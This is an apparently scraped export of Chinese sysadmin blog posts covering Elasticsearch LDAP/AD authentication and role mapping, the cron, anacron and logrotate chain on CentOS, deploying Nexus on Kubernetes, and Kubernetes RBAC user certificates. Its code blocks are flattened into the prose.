密码修改后使用老密码访问则返回401，使用更新后的密码则正常12345678910111213141516171819202122232425262728[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl ‘http://10.59.30.96:9200/_cat/indices?pretty’ -u kibana:kibana&#123; “error” : &#123; “root_cause” : [ &#123; “type” : “security_exception”, “reason” : “failed to authenticate user [kibana]”, “header” : &#123; “WWW-Authenticate” : “Basic realm=\\”security\\“ charset=\\”UTF-8\\“” &#125; &#125; ], “type” : “security_exception”, “reason” : “failed to authenticate user [kibana]”, “header” : &#123; “WWW-Authenticate” : “Basic realm=\\”security\\“ charset=\\”UTF-8\\“” &#125; &#125;, “status” : 401&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl ‘http://10.59.30.96:9200/_cat/indices?pretty’ -u kibana:123456yellow open .monitoring-es-6-2018.01.10 nND6-i_rR5iLEYVccBGj8w 1 1 yellow open .triggered_watches BtygGZisSDqiL3Y2TaQGqQ 1 1 green open .security-6 QVRL1mcFSAilryHGEhen7Q 1 0 yellow open .watcher-history-6-2018.01.10 SBGiHDAnTPiXFoHU65VY_g 1 1 yellow open .watches kMzN4j5cQySZQQSDVPww8w 1 1 yellow open .monitoring-alerts-6 VygY6VN9R3S0PR_jrGy50Q 1 1 [elasticsearch@elasticsearch elasticsearch-6.0.0]$ 配置ldap帐号认证ldap服务安装可参考：https://segmentfault.com/a/11... 添加下述ldap相关述配置 bind_dn为ldap的管理DN bind_password为管理dn的密码 user_search.base_dn为linux系统账户信息导入ldap的信息 user_search.attribute为账户在ldap中的标识信息 group_search.base_dn为linux系统组信息导入ldap的信息12345678910111213141516171819202122232425262728[elasticsearch@elasticsearch elasticsearch-6.0.0]$ vim config/elasticsearch.yml ……network.host: 10.59.30.96bootstrap.system_call_filter: falsexpack.ssl.key: elasticsearch/elasticsearch.keyxpack.ssl.certificate: elasticsearch/elasticsearch.crtxpack.ssl.certificate_authorities: ca/ca.crtxpack.security.transport.ssl.enabled: truexpack: security: authc: realms: ldap1: type: ldap order: 0 url: “ldap://10.59.30.95” bind_dn: “cn=Manager, dc=martin, dc=com” bind_password: 123456 user_search: base_dn: “ou=People,dc=martin,dc=com” attribute: uid group_search: base_dn: “ou=Group,dc=martin,dc=com” unmapped_groups_as_roles: false 配置AD域帐号认证添加下ldap相关述配置至elasticsearch.yml，此处为接着上述LDAP配置添加，如果只需配置AD认证请将ldap相关配置删除即可； domain_name为AD域的域名 url为AD域的地址 bind_dnw为随意的域账户名称（格式为user@domain） bind_password为上述账户的密码1234567891011121314151617181920212223xpack: security: authc: realms: ldap1: type: ldap order: 0 url: “ldap://10.59.30.94” bind_dn: “cn=Manager, dc=martin, dc=com” bind_password: 123456 user_search: base_dn: “ou=People,dc=martin,dc=com” attribute: uid group_search: base_dn: “ou=Group,dc=martin,dc=com” unmapped_groups_as_roles: false active_directory: type: active_directory order: 1 domain_name: martin.com url: ldap://ad.martin.com bind_dn: martin@martin.com bind_password: AD.123456 重启elasticsearch服务并使用ldap域账户user01登录 1234567891011121314151617181920212223242526272829303132[elasticsearch@elasticsearch elasticsearch-6.0.0]$ killall java[elasticsearch@elasticsearch elasticsearch-6.0.0]$ ./bin/elasticsearch -d[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -u user01:user01 ‘http://10.59.30.96:9200/_cat?pretty&#39;=^.^=/_cat/allocation/_cat/shards/_cat/shards/&#123;index&#125;/_cat/master/_cat/nodes/_cat/tasks/_cat/indices/_cat/indices/&#123;index&#125;/_cat/segments/_cat/segments/&#123;index&#125;/_cat/count/_cat/count/&#123;index&#125;/_cat/recovery/_cat/recovery/&#123;index&#125;/_cat/health/_cat/pending_tasks/_cat/aliases/_cat/aliases/&#123;alias&#125;/_cat/thread_pool/_cat/thread_pool/&#123;thread_pools&#125;/_cat/plugins/_cat/fielddata/_cat/fielddata/&#123;fields&#125;/_cat/nodeattrs/_cat/repositories/_cat/snapshots/&#123;repository&#125;/_cat/templates[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 使用AD域账户martin登录 123456789101112131415161718192021222324252627282930[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl http://10.59.30.96:9200/_cat?pretty -u martin:AD.123456=^.^=/_cat/allocation/_cat/shards/_cat/shards/&#123;index&#125;/_cat/master/_cat/nodes/_cat/tasks/_cat/indices/_cat/indices/&#123;index&#125;/_cat/segments/_cat/segments/&#123;index&#125;/_cat/count/_cat/count/&#123;index&#125;/_cat/recovery/_cat/recovery/&#123;index&#125;/_cat/health/_cat/pending_tasks/_cat/aliases/_cat/aliases/&#123;alias&#125;/_cat/thread_pool/_cat/thread_pool/&#123;thread_pools&#125;/_cat/plugins/_cat/fielddata/_cat/fielddata/&#123;fields&#125;/_cat/nodeattrs/_cat/repositories/_cat/snapshots/&#123;repository&#125;/_cat/templates[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 为域账户信息映射角色接口为：POST /_xpack/security/role_mapping/ 下述为映射user1*账户为管理员角色的操作步骤 1234567891011121314151617181920212223242526272829303132333435363738[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XPOST -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/role_mapping/ldap_user_admin?pretty’ -d ‘&#123;&gt; “roles”: [ “admin” ],&gt; “enabled”: true,&gt; “rules”: &#123;&gt; “any”: [&gt; &#123;&gt; “field”: &#123;&gt; “username”: “/user1/“&gt; &#125;&gt; &#125;&gt; ]&gt; &#125;&gt; &#125;’&#123; “role_mapping” : &#123; “created” : true &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -H ‘Content-type: application/json’ -u elastic:elastic ‘http://10.59.30.96:9200/_xpack/security/role_mapping/ldap_user_admin?pretty’&#123; “ldap_user_admin” : &#123; “enabled” : true, “roles” : [ “admin” ], “rules” : &#123; “any” : [ &#123; “field” : &#123; “username” : “/user1/“ &#125; &#125; ] &#125;, “metadata” : &#123; &#125; &#125;&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 验证域账户权限，使用user01无权访问indices接口，使用user11可以访问； 12345678910111213141516171819202122[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -u user01:user01 ‘http://10.59.30.96:9200/_cat/indices?pretty&#39;&#123; “error” : &#123; “root_cause” : [ &#123; “type” : “security_exception”, “reason” : “action [cluster:monitor/state] is unauthorized for user [user01]” &#125; ], “type” : “security_exception”, “reason” : “action [cluster:monitor/state] is unauthorized for user [user01]” &#125;, “status” : 403&#125;[elasticsearch@elasticsearch elasticsearch-6.0.0]$ curl -XGET -u user11:user11 ‘http://10.59.30.96:9200/_cat/indices?pretty&#39;yellow open .monitoring-es-6-2018.01.10 nND6-i_rR5iLEYVccBGj8w 1 1 6178 44 5.9mb 5.9mbyellow open .triggered_watches BtygGZisSDqiL3Y2TaQGqQ 1 1 0 0 11.7kb 11.7kbgreen open .security-6 QVRL1mcFSAilryHGEhen7Q 1 0 yellow open .watcher-history-6-2018.01.10 SBGiHDAnTPiXFoHU65VY_g 1 1 777 0 1.1mb 1.1mbyellow open .watches kMzN4j5cQySZQQSDVPww8w 1 1 5 0 40.2kb 40.2kbyellow open .monitoring-alerts-6 VygY6VN9R3S0PR_jrGy50Q 1 1 1 0 12.8kb 12.8kb[elasticsearch@elasticsearch elasticsearch-6.0.0]$ 常见报错No subject alternative names matching IP address 1234[2018-01-10T19:19:35,483][WARN ][o.e.x.s.t.n.SecurityNetty4Transport] [fzP4t-4] exception caught on transport layer [[id: 0x5d97fe48, L:/0:0:0:0:0:0:0:1:49121 ! R:/0:0:0:0:0:0:0:1:9300]], closing connection io.netty.handler.codec.DecoderException: javax.net.ssl.SSLHandshakeException: General SSLEngine problem......Caused by: java.security.cert.CertificateException: No subject alternative names matching IP address 0:0:0:0:0:0:0:1 found 解决方案为一种是关闭IPv6地址，另一种是修改ES_HOME/config/elasticsearch.yml中的network.host值为本机eth0的IP 参考文档 官方安装步骤：https://www.elastic.co/guide/... 配置内置账户密码：https://www.elastic.co/guide/... 修改账户密码：https://www.elastic.co/guide/... 用户相关操作：https://www.elastic.co/guide/... 使用LDAP认证： https://www.elastic.co/guide/... 用户角色映射： https://www.elastic.co/guide/...","categories":[],"tags":[{"name":"ELK","slug":"ELK","permalink":"http://chucz.club/tags/ELK/"}]},{"title":"crontab、anacron、logrotate relationship","slug":"crontab、anacron、logrotate-relationship","date":"2018-08-19T01:55:15.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/crontab、anacron、logrotate-relationship/","link":"","permalink":"http://chucz.club/2018/08/19/crontab、anacron、logrotate-relationship/","excerpt":"","text":"服务器上的nginx使用logrotate来分割日志，设置为每天分割。但是logrotate似乎没有工作，日志并没有分割。服务器是CentOS 6。 为了找到原因，分析可能出错的地方。如果是logrotate未执行，可能是crond没有启动，因为logrotate被/etc/cron.daily/logrotate脚本所启动，可以查看其中代码： 123456789[root@test ~]# cat /etc/cron.daily/logrotate#!/bin/sh/usr/sbin/logrotate /etc/logrotate.confEXITVALUE=$?if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate “ALERT exited abnormally with [$EXITVALUE]”fiexit 0 可以看到logrotate运行时加载配置文件logrotate.conf，而这个配置文件除了设定一些分割日志相关的选项，还包含分割日志的配置文件目录/etc/logrotate.d。 nginx的日志分割配置文件就保存在logrotate.d目录： 12345678910111213141516[root@test ~]# cat !$cat /etc/logrotate.d/nginx/root/*.log &#123; Daily Missingok rotate 52 compress delaycompress notifempty dateext create 644 nobody nobody sharedscripts postrotate [ -f /usr/local/nginx/logs/nginx.pid ] &amp;&amp; kill -USR1 cat &lt;span class=&quot;meta-keyword&quot;&gt;/usr/&lt;/span&gt;local&lt;span class=&quot;meta-keyword&quot;&gt;/nginx/&lt;/span&gt;logs/nginx.pid endscript&#125; /root/.log就是需要被分割的日志的目录，通配符表示目录内的所有log文件都被分割，分割的规则就是{…}中的内容。这里把/root/*.log当做nginx日志只是为了测试。在启动crond服务后，发现日志还是没有分割，于是想到会不会是/etc/logrotate.d/nginx配置文件的语法有问题，使用以下命令调试这个文件： 1logrotate -vfd /etc/logrotate.d/nginx # -vfd 三个选项分别表示显示详情，强制分割日志，只是调试配置文件而不是真的分割日志 输出结果表明有语法错误，Daily，Missingok 都应该是小写。改成daily，missingok。再次调试配置文件，可以正确分割日志： 123[root@test ~]# ls -1 /root/install-2017-5-14.loginstall-2017-5-14.log-20170521 #logrotate归档的日志 上面猜测是crond执行/etc/cron.daily/内的脚本，实现定时执行计划任务，包括执行logrotate日志分割。为了验证是否正确，网上搜索一番后找到了答案。如果没有crontab命令，先安装： 1234yum install crontabs #安装crond，crond实际上来自cronie包，这个包作为crontabs包的依赖被安装chkconfig –add crond #添加到开机启动列表chkconfig crond on #开机启动crond服务/etc/init.d/crond #立即启动crond以下文件或目录的作用：cron计划任务有两种类型： 1）系统cron任务：由crond服务执行，/etc/crontab配置系统级别的任务 2）用户cron任务：由crond服务执行，用crontab命令编辑用户级别的任务属于系统cron任务的文件或目录： /etc/cron.d #系统的任务脚本。执行 rpm -ql cronie 可以看到该目录被cronie包安装 /etc/cron.hourly #每小时执行其内脚本。其中的0anacron文件调用anacron来执行任务，它被包cronie-anacron安装 /etc/cron.daily #每天执行其内脚本。也被anacron执行其内脚本，logrotate调用脚本就在该目录内 /etc/cron.weekly #每周执行其内脚本。 /etc/cron.monthly #每月执行其内脚本。控制用户cron任务的执行： /etc/cron.allow #默认不存在，如果这个文件存在，只有用户在这个文件中才能使用crontab命令 /etc/cron.deny #将不可以使用crontab命令的用户写入其中注意：cron.allow和cron.deny就是用户名的列表，每行一个用户名。比如 cron.deny中有一行jason，效果是如果当前登录用户是jason，执行 crontab -e会提示不允许使用crontab命令。以下三个目录的作用：/var/spool/cron/USER_NAME#这个文件才是跟crontab -e/-l 关联的，这个文件保存了crontab -e编辑的任务内容#比如执行 crontab -u root -e，编辑保存后，就会有/var/spool/cron/root 这个文件/var/spool/anacron/{cron.daily,cron.monthly,cron.weekly}#这三个文件记录了anacron上一次执行的时间（上一天，上一周或上一月）#anacron任务执行时，对照这里的时间，决定是否执行anacron任务/var/lib/logrotate.status#这个文件记录logrotate执行情况，logrotate参考这个文件来决定是否需要rotate日志crontab和anacron和logrotate的关系：123456[root@test ~]# cat /etc/cron.d/0hourly #这个文件指定每小时的01分执行/etc/cron.hourly内的所有脚本SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/01 * root run-parts /etc/cron.hourly #这里的root指定执行任务的用户，run-parts其实是一个可执行脚本，在/usr/bin/run-parts，用来执行cron.hourly目录内的所有脚本 说明：用crontab -e命令每次编辑完某个用户的cron设置后，cron自动在/var/spool/cron下生成一个与此用户同名的文件，此用户的cron信息都记录在这个文件中。cron启动后每过一份钟读一次这个文件，检查是否要执行里面的命令。因此此文件修改后不需要重新启动cron服务。cron服务每分钟不仅要读一次/var/spool/cron内的所有文件，还需要读一次/etc/crontab，因此我们配置这个文件也能运用cron服务做一些事情。用crontab命令配置是针对某个用户的，而编辑/etc/crontab是针对系统的任务。此文件的文件格式是： 1234SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/bin #可执行文件查找路径MAILTO=root #如果出现错误，或者有数据输出，数据作为邮件发给这个帐号HOME=/ #使用者运行的路径，这里是根目录123456789101112131415161718[root@test ~]# cat /etc/cron.hourly/0anacron #cron.hourly目录下的脚本，根据条件执行anacron命令#!/bin/bash# Skip excecution unless the date has changed from the previous runif test -r /var/spool/anacron/cron.daily; then day=cat /var/spool/anacron/cron.dailyfiif [ date +%Y%m%d = “$day“ ]; then exit 0;fi# Skip excecution unless AC poweredif test -x /usr/bin/on_ac_power; then /usr/bin/on_ac_power &amp;&gt; /dev/null if test $? -eq 1; then exit 0 fifi/usr/sbin/anacron -s1234567891011121314151617[root@test ~]# cat /etc/anacrontab #如果执行anacron命令，那么接着查看anacron的配置文件# /etc/anacrontab: configuration file for anacron# See anacron(8) and anacrontab(5) for details.SHELL=/bin/shPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# the maximal random delay added to the base delay of the jobsRANDOM_DELAY=45 #最大延迟时间# the jobs will be started during the following hours onlySTART_HOURS_RANGE=3-22 #只有在3-22点之间执行任务#period in days delay in minutes job-identifier command1 5 cron.daily nice run-parts /etc/cron.daily7 25 cron.weekly nice run-parts /etc/cron.weekly@monthly 45 cron.monthly nice run-parts /etc/cron.monthly 以上anacrontab配置文件最重要的是最后一部分，以这行为例： 1 5 cron.daily nice run-parts /etc/cron.daily 表示每天都执行/etc/cront.daily/目录下的脚本文件，真实的延迟是RANDOM_DELAY+delay。这里的延迟是5分钟，加上上面的RANDOM_DELAY，所以实际的延迟时间是5-50之间，开始时间为03-22点，如果机器没关，那么一般就是在03:05-03:50之间执行。nice命令将该进程设置为nice=10，默认为0，即低优先级进程。如果RANDOM_DELAY=0，那么表示准确延迟5min，即03:05执行cron.daily内的脚本。 123456789[root@test ~]# cat /etc/cron.daily/logrotate #最后在cron.daily内有logrotate的调用脚本#!/bin/sh/usr/sbin/logrotate /etc/logrotate.conf #logrotate将会读取配置文件，最终会读取到/etc/logrotate.d/nginxEXITVALUE=$?if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate “ALERT exited abnormally with [$EXITVALUE]”fiexit 0 当logrotate命令加载了/etc/logrotate.d/nginx配置文件时，还要比较nginx日志的归档日期： 12[root@test ~]# cat /var/lib/logrotate.status | grep /root“/root/install-2017-5-14.log” 2017-5-21 #如果今天是2017-5-21，这个文件里也是2017-5-21，说明今天已经归档过了，否则就会归档（分割）nginx日志 综上，整个逻辑流程为： crond服务加载/etc/cron.d/0hourly —&gt;在每小时的01分执行/etc/cront.hourly/0anacron —&gt;执行anacron —&gt;根据/etc/anacrontab的配置执行/etc/cron.daily，/etc/cron.weekly，/etc/cron.monthly —&gt;执行/etc/cron.daily/下的logrotate脚本 —&gt;执行logrotate —&gt;根据/etc/logrotate.conf配置执行脚本/etc/logrotate.d/nginx —&gt;分割nginx日志成功","categories":[],"tags":[{"name":"Logrotate","slug":"Logrotate","permalink":"http://chucz.club/tags/Logrotate/"}]},{"title":"基于k8s 动态配置及扩容maven nexus私服","slug":"基于k8s-动态配置及扩容maven-nexus私服","date":"2018-08-19T01:53:31.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/基于k8s-动态配置及扩容maven-nexus私服/","link":"","permalink":"http://chucz.club/2018/08/19/基于k8s-动态配置及扩容maven-nexus私服/","excerpt":"","text":"配置nexus从官网下载了nexus之后还需要进行一些配置。编辑bin/nexus.vmoptions 调整后的如下： 12345678910111213141516-Xms600M-Xmx600M-XX:MaxDirectMemorySize=1G-XX:+UnlockDiagnosticVMOptions-XX:+UnsyncloadClass-XX:+LogVMOutput-XX:LogFile=/data/docker/soft/nexus/log/jvm.log-XX:-OmitStackTraceInFastThrow-Djava.net.preferIPv4Stack=true-Dkaraf.home=.-Dkaraf.base=.-Dkaraf.etc=etc/karaf-Djava.util.logging.config.file=etc/karaf/java.util.logging.properties-Dkaraf.data=/data/docker/soft/nexus/data-Djava.io.tmpdir=/data/docker/soft/nexus/tmp-Dkaraf.startLocalConsole=false 其中除了1，2行的jvm内存配置之外，最关键的就是，以下几个属性配置： -XX:LogFile=/data/docker/soft/nexus/log/jvm.log # 日志文件生成位置 -Dkaraf.data=/data/docker/soft/nexus/data # 仓库数据存放位置(上传的jar包) -Djava.io.tmpdir=/data/docker/soft/nexus/tmp # 临时文件存放位置 制作Docker镜像配置好nexus之后，需要再制作自己的docker镜像，因为k8s就是调度镜像容器的。 123456789[root@master nexus]# pwd/data/docker/dockerfile/nexus[root@master nexus]# ls -lth total 223M-rw-r–r– 1 root root 146 Jun 21 16:06 Dockerfile-rw-r–r– 1 root root 108M Jun 21 16:02 nexus3.tar.gzdrwxr-xr-x 3 root root 4.0K Jun 21 15:53 sonatype-workdrwxr-xr-x 9 root root 4.0K Jun 21 15:53 nexus-3.12.1-01-rw-r–r– 1 root root 115M Jun 21 15:36 nexus-3.12.1-01-unix.tar.gz.org docker镜像的制作很简单，新建一个Dockerfile文件： 123456[root@master nexus]# cat Dockerfile FROM registry.cn-hangzhou.aliyuncs.com/luhaoyuan/oracle-jdk8:latestADD nexus3.tar.gz /optENTRYPOINT [“/opt/nexus-3.12.1-01/bin/nexus”, “run”] 第一行：nexus的运行是依赖JDK环境的，所以我们这里就使用jdk作为基础镜像；(镜像是基于centos7，比较大，后续可以考虑修改为alpine_3.6) 第二行：将我们配置过后的nexus(nexus-3.12.1-01)再重新打包一下，添加到容器中；* 第三行：启动容器时，执行的命令，nexus的启动命令有start和run，由于start默认是启动在后台进程的，这样容器一启动就退出了。所以这里必须要使用run命令启动了。 最后构建Docker镜像：docker build -t registry.martin.com:5000/tools/nexus:3.12.1 .registry.martin.com:5000为我registry地址,构建之后将改image push到私库,当然也可以用harbor如果有做ca校验，需要将证书拷贝到指定的:/etc/docker/certs.d/xxx/ca.crt,然后docker login校验再docker push registry.martin.com:5000/tools/nexus:3.12.1，不然会提示x509认证失败 配置k8s PV-PVC为了避免容器重启数据丢失，需要挂载主机的卷空间。在k8s中，pod挂载主机的存储卷，就需要使用到了PV（PersistentVolume）和PVC（PersistentVolumeClaim）。新建nexus3-pv-pvc.yaml文件： 12345678910111213141516171819202122232425262728293031323334353637383940[root@master nexus]# pwd/data/k8s/nexus[root@master nexus]# ls -lthtotal 12K-rw-r–r– 1 root root 777 Jun 21 18:49 nexus3-deployment.yaml-rw-r–r– 1 root root 370 Jun 21 17:12 nexus3-service.yaml-rw-r–r– 1 root root 525 Jun 21 16:49 nexus3-pv-pvc.yaml[root@master nexus]# cat nexus3-pv-pvc.yaml apiVersion: v1kind: PersistentVolumemetadata: name: nexus3-data-pv labels: app: nexus3-data-pvspec: capacity: storage: 500Gi accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Recycle hostPath: path: /data/docker/soft/nexus—apiVersion: v1kind: PersistentVolumeClaimmetadata: name: nexus3-data-pvc labels: app: nexus3-data-pvcspec: accessModes: - ReadWriteOnce resources: requests: storage: 500Gi selector: matchLabels: app: nexus3-data-pv[root@master nexus]# ==注意：PV中的hostPath，指定了宿主主机上的挂载路径(node节点最好全部先创建好)== 配置k8s Deployment在k8s早期更多的是使用ReplicationController (RC)来控制保障pod，不过后来又出现了Deployment。Deployment不仅包含了RC的所有功能，还具有：版本记录、回滚、暂停和启动等多种额外的强大功能。所以可以尽量都使用Deployment,新建nexus3-deployment.yaml文件： 123456789101112131415161718192021222324252627282930313233[root@master nexus]# cat nexus3-deployment.yaml kind: DeploymentapiVersion: extensions/v1beta1metadata: labels: app: nexus3 name: nexus3spec: replicas: 1 selector: matchLabels: app: nexus3 template: metadata: labels: app: nexus3 spec: containers: - name: nexus3 image: registry.martin.com:5000/tools/nexus:3.12.1 imagePullPolicy: IfNotPresent ports: - containerPort: 9193 protocol: TCP volumeMounts: - name: nexus-data mountPath: /data/docker/soft/nexus volumes: - name: nexus-data persistentVolumeClaim: claimName: nexus3-data-pvc nodeSelector: kubernetes.io/hostname: 192.168.0.15 需要在volumes结点上引用之前创建的PVC： 1234volumes: - name: nexus-data persistentVolumeClaim: claimName: nexus3-data-pvc 在volumeMounts结点上，配置了挂载到容器中的路径：/data/docker/soft/nexus(node节点最好全部先创建好) 123volumeMounts: - name: nexus-data mountPath: /data/docker/soft/nexus 最后的nodeSelector表示pod只在某个主机上运行,可以通过在k8s的master上使用:kubectl get nodes查看 配置k8s Servicek8s中的pod的访问是不可靠的，随时可能发生pod停止-漂移-创建的过程。所以要想能够稳定的访问，就必须要创建Service进行服务发现了，在Service中是根据selector来寻找pod的。最后k8s上的Service只能在集群节点上访问，如果我们想要在集群外部进行访问的话，只有三种方式： NodePort、 LoadBalancer、 Ingress。 这里使用NodePort，绑定宿主机的端口来进行暴露服务。跟docker run -p 看上去效果相似。新建nexus3-service.yaml文件： 1234567891011121314151617[root@master nexus]# cat nexus3-service.yaml apiVersion: v1kind: Servicemetadata: labels: app: nexus3 name: nexus3spec: type: NodePort ports: - port: 8081 targetPort: 8081 nodePort: 30031 name: web-ui selector: app: nexus3[root@master nexus]# 其中关键的地方就是spec.type节点配置NodePort类型了。说明下的ports 端口的配置： port 属性定义了Service的虚端口； targetPort 属性指定了后面pod上提供的端口，如果没有指定则默认与port相同(这里我们显视的指定了)； nodePort 属性指定了绑定在宿主机(物理机)上的端口号，我们可以通过宿主机IP + 端口的形式访问到后方pod中的服。 name 如果有多个port配置的话，必须要为每个port指定一个名称。 k8s部署访问创建 PV-PVC根据配置文件，创建PV-PVC： kubectl create -f nexus3-pv-pvc.yaml 创建完成后，查看一下状态，是否正常： kubectl get pv 12NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGEnexus3-data-pv 500Gi RWO Recycle Bound default/nexus3-data-pvc 17h 创建Deployment继续创建Deployment，创建完后会自动创建pod的，并维护pod数量始终为1。 kubectl create -f nexus3-deployment.yaml 稍等几秒钟，查看pod状态： kubectl get pod -o wide 12NAME READY STATUS RESTARTS AGE IP NODEnexus3-68f55d9746-vfnf8 1/1 Running 0 12h 10.20.7.12 192.168.0.15 ==注意：默认不用-n指定namespace的都是用的default，-o wide可以看到详细的IP及node信息== 创建Service创建Service，暴露服务： 1kubectl create -f nexus3-service.yaml 查看状态： 12345 kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 10.10.0.1 &lt;none&gt; 443/TCP 13dnexus3 NodePort 10.10.165.3 &lt;none&gt; 8081:30031/TCP,5000:30032/TCP,8889:30033/TCP 12hnginx-service ClusterIP 10.10.147.216 &lt;none&gt; 80/TCP 10d ==注意这里的访问，是访问宿主机的IP+端口，至于CLUSTER-IP这些都是虚拟的IP，无法在外部进行访问的==。 访问Nexushttp://192.168.1.2:30031 (pod内container端口为：8081) 升级借用k8s Deployment的升级方式: 从官网下载最新的nexus安装包； 修改nexus配置文件，将上面旧版本的配置覆盖过来就行了； 修改Dockerfile文件，构建新的Docker镜像，将新打包的nexus放入镜像中。如：docker build -t registry.martin.com:5000/tools/nexus:3.12.2 .Ps: 不要忘记启动命令路径也要调整! 使用k8s命令升级Deployment：如：kubectl set image deployment/nexus3 nexus3=registry.martin.com:5000/tools/nexus:3.12.2 回滚升级，如果发现升级了的不好用，或者出现问题，也可以回滚：如：kubectl rollout undo deployment/nexus3 总结其实这个过程中里复杂了一部分，也简化了一部分。复杂了pv-pvc过程，pv-pvc不用创建直接在Deployment中挂载hostPath也是可以的。简化了Deployment，其实应该还需要加上cpu、内存等资源限制的。这里只是在nexus配置文件中做了限制，如果出现内存泄漏问题，还是没办法解决!","categories":[],"tags":[{"name":"K8s","slug":"K8s","permalink":"http://chucz.club/tags/K8s/"}]},{"title":"Kubernetes RBAC  Detailed","slug":"Kubernetes-RBAC-Detailed","date":"2018-08-19T01:51:37.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/19/Kubernetes-RBAC-Detailed/","link":"","permalink":"http://chucz.club/2018/08/19/Kubernetes-RBAC-Detailed/","excerpt":"","text":"RBAC - 基于角色的访问控制RBAC使用：rbac.authorization.k8s.io API Group 来实现授权决策，允许管理员通过 Kubernetes API 动态配置策略，要启用RBAC，需要在 apiserver 中添加参数–authorization-mode=RBAC，如果使用的kubeadm安装的集群，1.6 版本以上的都默认开启了RBAC，可以通过查看 Master 节点上 apiserver 的静态Pod定义文件： 123456$ cat /usr/lib/systemd/system/kube-apiserver.service或者是：$ cat /etc/kubernetes/manifests/kube-apiserver.yaml… - –authorization-mode=Node,RBAC… 如果是二进制的方式搭建的集群，添加这个参数过后，记得要重启 apiserver 服务。 RBAC API 对象Kubernetes有一个很基本的特性就是它的所有资源对象都是模型化的 API 对象，允许执行 CRUD(Create、Read、Update、Delete)操作(也就是我们常说的增、删、改、查操作)，比如下面的这下资源： Pods ConfigMaps Deployments Nodes Secrets Namespaces 上面这些资源对象的可能存在的操作有： create get delete list update edit watch exec 在更上层，这些资源和API Group 进行关联，比如Pods属于Core API Group，而Deployements属于 apps API Group，要在Kubernetes中进行RBAC的管理，除了上面的这些资源和操作以外，我们还需要另外的一些对象： Rule：规则，规则是一组属于不同API Group 资源上的一组操作的集合 Role 和 ClusterRole：角色和集群角色，这两个对象都包含上面的Rules 元素，二者的区别在于，在Role 中，定义的规则只适用于单个命名空间，也就是和namespace 关联的，而ClusterRole 是集群范围内的，因此定义的规则不受命名空间的约束。另外Role和 ClusterRole在Kubernetes中都被定义为集群内部的API 资源，和Pod、ConfigMap 这些类似，都是集群的资源对象，所以同样的可以使用kubectl相关的命令来进行操作 Subject：主题，对应在集群中尝试操作的对象，集群中定义了3种类型的主题资源： * User Account：用户，这是有外部独立服务进行管理的，管理员进行私钥的分配，用户可以使用KeyStone或者Goolge 帐号，甚至一个用户名和密码的文件列表也可以。对于用户的管理集群内部没有一个关联的资源对象，所以用户不能通过集群内部的API 来进行管理 Group：组，这是用来关联多个账户的，集群中有一些默认创建的组，比如cluster-admin Service Account：服务帐号，通过Kubernetes API 来管理的一些用户帐号，和namespace 进行关联的，适用于集群内部运行的应用程序，需要通过API 来完成权限认证，所以在集群内部进行权限操作，都需要使用到 ServiceAccount RoleBinding和 ClusterRoleBinding：角色绑定和集群角色绑定，简单来说就是把声明的Subject和Role 进行绑定的过程(给某个用户绑定上操作的权限)，二者的区别也是作用范围的区别：RoleBinding只会影响到当前namespace 下面的资源操作权限，而ClusterRoleBinding会影响到所有的 namespace。 示例通过如下示例来演示RBAC的配置方法： 创建一个只能访问某个 namespace 的用户创建一个 User Account，只能访问 kube-system这个命名空间： username: martin group: op 第一步：创建用户凭证Kubernetes没有User Account的API 对象，不过要创建一个用户帐号的话也是挺简单的，利用管理员分配的一个私钥就可以创建了。创建方法有两种: 1. 使用OpenSSL证书来创建User； 给用户martin创建一个私钥，命名成：martin.key：1$ openssl genrsa -out martin.key 2048 使用刚刚创建的私钥创建一个证书签名请求文件：martin.csr，要注意需要确保在-subj参数中指定用户名和组(CN表示用户名，O表示组)：1$ openssl req -new -key martin.key -out martin.csr -subj “/CN=martin/O=op” 然后找到Kubernetes集群的CA，我们使用的是kubeadm安装的集群，CA相关证书位于/etc/kubernetes/pki/目录下面，如果是二进制方式搭建的，应该在最开始搭建集群的时候就已经指定好了CA的目录(/data/kubernetes/ssl)，然后利用该目录下面的ca.crt和ca.key两个文件来批准上面的证书请求 生成最终的证书文件，这里设置证书的有效期为500天1234$ openssl x509 -req -in martin.csr -CA /data/kubernetes/ssl/ca.crt -CAkey /data/kubernetes/ssl/ca.key -CAcreateserial -out martin.crt -days 500现在查看当前文件夹下面是否生成了一个证书文件：$ lsmartin.csr martin.key martin.crt 现在可以使用刚刚创建的证书文件和私钥文件在集群中创建新的凭证和上下文(Context):1$ kubectl config set-credentials martin –client-certificate=martin.crt –client-key=martin.key 可以看到一个用户martin创建了，然后为这个用户设置新的 Context:1$ kubectl config set-context martin-context –cluster=kubernetes –namespace=kube-system –user=martin 到这里，用户martin就已经创建成功了，现在使用当前的这个配置文件来操作kubectl命令的时候，应该会出现错误，因为还没有为该用户定义任何操作的权限： 12$ kubectl get pods –context=martin-contextError from server (Forbidden): pods is forbidden: User “martin” cannot list pods in the namespace “default” 2. 使用cfssl工具来创建，也是参考官方文档中的方法。 CFSSL是CloudFlare开源的一款PKI/TLS工具。 CFSSL 包含一个命令行工具和一个用于签名，验证并且捆绑TLS证书的HTTP API服务。使用Go语言编写。 CFSSL包括： 一组用于生成自定义TLS PKI的工具 